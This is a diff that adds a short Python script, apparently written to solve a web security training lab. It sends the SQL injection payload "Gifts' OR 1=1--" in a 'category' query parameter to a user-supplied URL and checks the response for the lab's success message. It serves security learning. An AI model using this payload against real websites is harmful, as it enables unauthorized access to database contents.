@@ -1,0 +1,21 @@
+import requests
+
+
+task_url = input("paste the the link address here: ")
+# 1. copy the link and paste it in here, trim it till the filter word
+
+# 2. By putting the request inside the params
+# the space ( ) automatically becomes the (%20) or (+)
+# the quote (') automatically becomes the (%27)
+params = {
+    'category': "Gifts' OR 1=1--"
+}
+
+print(f" Sending encoded payload to: {task_url}")
+response = requests.get(task_url, params=params)
+
+# 3. Check the page content to see if the lab registers as solved
+if "Congratulations, you solved the lab!" in response.text:
+    print(" => Success: Lab solved successfully!")
+else:
+    print(" => Failed: Exploit did not trigger the solution.")
